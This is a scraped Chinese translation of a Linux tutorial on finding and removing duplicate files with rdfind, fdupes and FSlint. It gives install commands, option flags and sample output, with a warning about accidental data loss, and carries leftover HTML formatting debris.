"title": "如何在 Linux 中找到并删除重复文件", "create_time": "2018/10/19", "vote": "1", "bookmark": 0, "comments": 0, "content": "\r\n\r\n        \t\t\t,\n\t\t\r\n\t\t,原文出处： ,SK,   译文出处：,Linux中国/Andy Luo,   ,\n,在编辑或修改配置文件或旧文件前，我经常会把它们备份到硬盘的某个地方，因此我如果意外地改错了这些文件，我可以从备份中恢复它们。但问题是如果我忘记清理备份文件，一段时间之后，我的磁盘会被这些大量重复文件填满 —— 我觉得要么是懒得清理这些旧文件，要么是担心可能会删掉重要文件。如果你们像我一样，在类 Unix 操作系统中，大量多版本的相同文件放在不同的备份目录，你可以使用下面的工具找到并删除重复文件。,\n,提醒一句：,\n,在删除重复文件的时请尽量小心。如果你不小心，也许会导致,意外丢失数据,。我建议你在使用这些工具的时候要特别注意。,\n,在 Linux 中找到并删除重复文件,\n,出于本指南的目的，我将讨论下面的三个工具：,\n,\n,Rdfind,\n,Fdupes,\n,FSlint,\n,\n,这三个工具是自由开源的，且运行在大多数类 Unix 系统中。,\n,1. Rdfind,\n,Rdfind, 意即 ,r,edundant ,d,ata ,find,（冗余数据查找），是一个通过访问目录和子目录来找出重复文件的自由开源的工具。它是基于文件内容而不是文件名来比较。Rdfind 使用,排序,算法来区分原始文件和重复文件。如果你有两个或者更多的相同文件，Rdfind 会很智能的找到原始文件并认定剩下的文件为重复文件。一旦找到副本文件，它会向你报告。你可以决定是删除还是使用,硬链接或者符号（软）链接,代替它们。,\n,安装 Rdfind,\n,Rdfind 存在于 ,AUR, 中。因此，在基于 Arch 的系统中，你可以像下面一样使用任一如 ,Yay, AUR 程序助手安装它。,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n$ yay -S rdfind,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,$, ,yay, ,-,S, ,rdfind,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,在 Debian、Ubuntu、Linux Mint 上：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n$ sudo apt-get install rdfind,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,$, ,sudo ,apt,-,get ,install ,rdfind,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,在 Fedora 上：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n$ sudo dnf install rdfind,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,$, ,sudo ,dnf ,install ,rdfind,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,在 RHEL、CentOS 上：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n$ sudo yum install epel-release\r\n$ sudo yum install rdfind,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,$, ,sudo ,yum ,install ,epel,-,release,$, ,sudo ,yum ,install ,rdfind,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,用法,\n,一旦安装完成，仅带上目录路径运行 Rdfind 命令就可以扫描重复文件。,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n$ rdfind ~/Downloads,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,$, ,rdfind, ,~,/,Downloads,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,\n,正如你看到上面的截屏，Rdfind 命令将扫描 ,~/Downloads, 目录，并将结果存储到当前工作目录下一个名为 ,results.txt, 的文件中。你可以在 ,results.txt, 文件中看到可能是重复文件的名字。,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n$ cat results.txt\r\n# Automatically generated\r\n# duptype id depth size device inode priority name\r\nDUPTYPE_FIRST_OCCURRENCE 1469 8 9 2050 15864884 1 /home/sk/Downloads/tor-browser_en-US/Browser/TorBrowser/Tor/PluggableTransports/fte/tests/dfas/test5.regex\r\nDUPTYPE_WITHIN_SAME_TREE -1469 8 9 2050 15864886 1 /home/sk/Downloads/tor-browser_en-US/Browser/TorBrowser/Tor/PluggableTransports/fte/tests/dfas/test6.regex\r\n[...]\r\nDUPTYPE_FIRST_OCCURRENCE 13 0 403635 2050 15740257 1 /home/sk/Downloads/Hyperledger(1).pdf\r\nDUPTYPE_WITHIN_SAME_TREE -13 0 403635 2050 15741071 1 /home/sk/Downloads/Hyperledger.pdf\r\n# end of file\r\n,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,5,6,7,8,9,10,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,$, ,cat ,results,.,txt,# Automatically generated,# duptype id depth size device inode priority name,DUPTYPE_FIRST,_,OCCURRENCE, ,1469, ,8, ,9, ,2050, ,15864884, ,1, ,/,home,/,sk,/,Downloads,/,tor,-,browser_en,-,US,/,Browser,/,TorBrowser,/,Tor,/,PluggableTransports,/,fte,/,tests,/,dfas,/,test5,.,regex,DUPTYPE_WITHIN_SAME_TREE, ,-,1469, ,8, ,9, ,2050, ,15864886, ,1, ,/,home,/,sk,/,Downloads,/,tor,-,browser_en,-,US,/,Browser,/,TorBrowser,/,Tor,/,PluggableTransports,/,fte,/,tests,/,dfas,/,test6,.,regex,[,.,.,.,],DUPTYPE_FIRST,_,OCCURRENCE, ,13, ,0, ,403635, ,2050, ,15740257, ,1, ,/,home,/,sk,/,Downloads,/,Hyperledger,(,1,),.,pdf,DUPTYPE_WITHIN_SAME_TREE, ,-,13, ,0, ,403635, ,2050, ,15741071, ,1, ,/,home,/,sk,/,Downloads,/,Hyperledger,.,pdf,# end of file, ,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,通过检查 ,results.txt, 文件，你可以很容易的找到那些重复文件。如果愿意你可以手动的删除它们。,\n,此外，你可在不修改其他事情情况下使用 ,-dryrun, 选项找出所有重复文件，并在终端上输出汇总信息。,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n$ rdfind -dryrun true ~/Downloads,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,$, ,rdfind, ,-,dryrun ,true, ,~,/,Downloads,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,一旦找到重复文件，你可以使用硬链接或符号链接代替他们。,\n,使用硬链接代替所有重复文件，运行：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n$ rdfind -makehardlinks true ~/Downloads,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,$, ,rdfind, ,-,makehardlinks ,true, ,~,/,Downloads,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,使用符号链接/软链接代替所有重复文件，运行：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n$ rdfind -makesymlinks true ~/Downloads,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,$, ,rdfind, ,-,makesymlinks ,true, ,~,/,Downloads,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,目录中有一些空文件，也许你想忽略他们，你可以像下面一样使用 ,-ignoreempty, 选项：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n$ rdfind -ignoreempty true ~/Downloads,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,$, ,rdfind, ,-,ignoreempty ,true, ,~,/,Downloads,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,如果你不再想要这些旧文件，删除重复文件，而不是使用硬链接或软链接代替它们。,\n,删除重复文件，就运行：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n$ rdfind -deleteduplicates true ~/Downloads,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,$, ,rdfind, ,-,deleteduplicates ,true, ,~,/,Downloads,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,如果你不想忽略空文件，并且和所哟重复文件一起删除。运行：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n$ rdfind -deleteduplicates true -ignoreempty false ~/Downloads,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,$, ,rdfind, ,-,deleteduplicates ,true, ,-,ignoreempty ,false, ,~,/,Downloads,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,更多细节，参照帮助部分：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n$ rdfind --help,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,$, ,rdfind, ,--,help,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,手册页：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n$ man rdfind,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,$, ,man ,rdfind,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,\n,2. Fdupes,\n,Fdupes, 是另一个在指定目录以及子目录中识别和移除重复文件的命令行工具。这是一个使用 C 语言编写的自由开源工具。Fdupes 通过对比文件大小、部分 MD5 签名、全部 MD5 签名，最后执行逐个字节对比校验来识别重复文件。,\n,与 Rdfind 工具类似，Fdupes 附带非常少的选项来执行操作，如：,\n,\n,在目录和子目录中递归的搜索重复文件,\n,从计算中排除空文件和隐藏文件,\n,显示重复文件大小,\n,出现重复文件时立即删除,\n,使用不同的拥有者/组或权限位来排除重复文件,\n,更多,\n,\n,安装 Fdupes,\n,Fdupes 存在于大多数 Linux 发行版的默认仓库中。,\n,在 Arch Linux 和它的变种如 Antergos、Manjaro Linux 上，如下使用 Pacman 安装它。,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n$ sudo pacman -S fdupes,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,$, ,sudo ,pacman, ,-,S, ,fdupes,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,在 Debian、Ubuntu、Linux Mint 上:,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n$ sudo apt-get install fdupes,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,$, ,sudo ,apt,-,get ,install ,fdupes,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,在 Fedora 上：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n$ sudo dnf install fdupes,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,$, ,sudo ,dnf ,install ,fdupes,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,在 RHEL、CentOS 上：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n$ sudo yum install epel-release\r\n$ sudo yum install fdupes,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,$, ,sudo ,yum ,install ,epel,-,release,$, ,sudo ,yum ,install ,fdupes,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,用法,\n,Fdupes 用法非常简单。仅运行下面的命令就可以在目录中找到重复文件，如：,~/Downloads,。,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n$ fdupes ~/Downloads,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,$, ,fdupes, ,~,/,Downloads,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,我系统中的样例输出：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n/home/sk/Downloads/Hyperledger.pdf\r\n/home/sk/Downloads/Hyperledger(1).pdf,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,/,home,/,sk,/,Downloads,/,Hyperledger,.,pdf,/,home,/,sk,/,Downloads,/,Hyperledger,(,1,),.,pdf,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,你可以看到，在 ,/home/sk/Downloads/, 目录下有一个重复文件。它仅显示了父级目录中的重复文件。如何显示子目录中的重复文件？像下面一样，使用 ,-r, 选项。,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n$ fdupes -r ~/Downloads,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,$, ,fdupes, ,-,r, ,~,/,Downloads,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,现在你将看到 ,/home/sk/Downloads/, 目录以及子目录中的重复文件。,\n,Fdupes 也可用来从多个目录中迅速查找重复文件。,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n$ fdupes ~/Downloads ~/Documents/ostechnix,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,$, ,fdupes, ,~,/,Downloads, ,~,/,Documents,/,ostechnix,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,你甚至可以搜索多个目录，递归搜索其中一个目录，如下：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n$ fdupes ~/Downloads -r ~/Documents/ostechnix,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,$, ,fdupes, ,~,/,Downloads, ,-,r, ,~,/,Documents,/,ostechnix,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,上面的命令将搜索 ,~/Downloads, 目录，,~/Documents/ostechnix, 目录和它的子目录中的重复文件。,\n,有时，你可能想要知道一个目录中重复文件的大小。你可以使用 ,-S, 选项，如下：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n$ fdupes -S ~/Downloads\r\n403635 bytes each:\r\n/home/sk/Downloads/Hyperledger.pdf\r\n/home/sk/Downloads/Hyperledger(1).pdf,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,$, ,fdupes, ,-,S, ,~,/,Downloads,403635, ,bytes ,each,:,/,home,/,sk,/,Downloads,/,Hyperledger,.,pdf,/,home,/,sk,/,Downloads,/,Hyperledger,(,1,),.,pdf,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,类似的，为了显示父目录和子目录中重复文件的大小，使用 ,-Sr, 选项。,\n,我们可以在计算时分别使用 ,-n, 和 ,-A, 选项排除空白文件以及排除隐藏文件。,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n$ fdupes -n ~/Downloads\r\n$ fdupes -A ~/Downloads,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,$, ,fdupes, ,-,n, ,~,/,Downloads,$, ,fdupes, ,-,A, ,~,/,Downloads,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,在搜索指定目录的重复文件时，第一个命令将排除零长度文件，后面的命令将排除隐藏文件。,\n,汇总重复文件信息，使用 ,-m, 选项。,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n$ fdupes -m ~/Downloads\r\n1 duplicate files (in 1 sets), occupying 403.6 kilobytes,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,$, ,fdupes, ,-,m, ,~,/,Downloads,1, ,duplicate ,files, ,(,in, ,1, ,sets,),,, ,occupying, ,403.6, ,kilobytes,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,删除所有重复文件，使用 ,-d, 选项。,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n$ fdupes -d ~/Downloads,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,$, ,fdupes, ,-,d, ,~,/,Downloads,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,样例输出：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n[1] /home/sk/Downloads/Hyperledger Fabric Installation.pdf\r\n[2] /home/sk/Downloads/Hyperledger Fabric Installation(1).pdf\r\n\r\nSet 1 of 1, preserve files [1 - 2, all]:,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,[,1,], ,/,home,/,sk,/,Downloads,/,Hyperledger ,Fabric ,Installation,.,pdf,[,2,], ,/,home,/,sk,/,Downloads,/,Hyperledger ,Fabric ,Installation,(,1,),.,pdf, ,Set, ,1, ,of, ,1,,, ,preserve ,files, ,[,1, ,-, ,2,,, ,all,],:,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,这个命令将提示你保留还是删除所有其他重复文件。输入任一号码保留相应的文件，并删除剩下的文件。当使用这个选项的时候需要更加注意。如果不小心，你可能会删除原文件。,\n,如果你想要每次保留每个重复文件集合的第一个文件，且无提示的删除其他文件，使用 ,-dN, 选项（不推荐）。,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n$ fdupes -dN ~/Downloads,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,$, ,fdupes, ,-,dN, ,~,/,Downloads,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,当遇到重复文件时删除它们，使用 ,-I, 标志。,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n$ fdupes -I ~/Downloads,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,$, ,fdupes, ,-,I, ,~,/,Downloads,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,关于 Fdupes 的更多细节，查看帮助部分和 man 页面。,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n$ fdupes --help\r\n$ man fdupes,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,$, ,fdupes, ,--,help,$, ,man ,fdupes,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,\n,3. FSlint,\n,FSlint, 是另外一个查找重复文件的工具，有时我用它去掉 Linux 系统中不需要的重复文件并释放磁盘空间。不像另外两个工具，FSlint 有 GUI 和 CLI 两种模式。因此对于新手来说它更友好。FSlint 不仅仅找出重复文件，也找出坏符号链接、坏名字文件、临时文件、坏的用户 ID、空目录和非精简的二进制文件等等。,\n,安装 FSlint,\n,FSlint 存在于 ,AUR,，因此你可以使用任一 AUR 助手安装它。,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n$ yay -S fslint,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,$, ,yay, ,-,S, ,fslint,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,在 Debian、Ubuntu、Linux Mint 上：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n$ sudo apt-get install fslint,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,$, ,sudo ,apt,-,get ,install ,fslint,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,在 Fedora 上：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n$ sudo dnf install fslint,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,$, ,sudo ,dnf ,install ,fslint,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,在 RHEL，CentOS 上：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n$ sudo yum install epel-release\r\n$ sudo yum install fslint,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,$, ,sudo ,yum ,install ,epel,-,release,$, ,sudo ,yum ,install ,fslint,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,一旦安装完成，从菜单或者应用程序启动器启动它。,\n,FSlint GUI 展示如下：,\n,\n,如你所见，FSlint 界面友好、一目了然。在 “Search path” 栏，添加你要扫描的目录路径，点击左下角 “Find” 按钮查找重复文件。验证递归选项可以在目录和子目录中递归的搜索重复文件。FSlint 将快速的扫描给定的目录并列出重复文件。,\n,\n,从列表中选择那些要清理的重复文件，也可以选择 “Save”、“Delete”、“Merge” 和 “Symlink” 操作他们。,\n,在 “Advanced search parameters” 栏，你可以在搜索重复文件的时候指定排除的路径。,\n,\n,FSlint 命令行选项,\n,FSlint 提供下面的 CLI 工具集在你的文件系统中查找重复文件。,\n,\n,findup, — 查找重复文件,\n,findnl, — 查找名称规范（有问题的文件名）,\n,findu8, — 查找非法的 utf8 编码的文件名,\n,findbl, — 查找坏链接（有问题的符号链接）,\n,findsn, — 查找同名文件（可能有冲突的文件名）,\n,finded, — 查找空目录,\n,findid, — 查找死用户的文件,\n,findns, — 查找非精简的可执行文件,\n,findrs, — 查找文件名中多余的空白,\n,findtf, — 查找临时文件,\n,findul, — 查找可能未使用的库,\n,zipdir, — 回收 ext2 目录项下浪费的空间,\n,\n,所有这些工具位于 ,/usr/share/fslint/fslint/fslint, 下面。,\n,例如，在给定的目录中查找重复文件，运行：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n$ /usr/share/fslint/fslint/findup ~/Downloads/,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,$, ,/,usr,/,share,/,fslint,/,fslint,/,findup, ,~,/,Downloads,/,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,类似的，找出空目录命令是：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n$ /usr/share/fslint/fslint/finded ~/Downloads/,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,$, ,/,usr,/,share,/,fslint,/,fslint,/,finded, 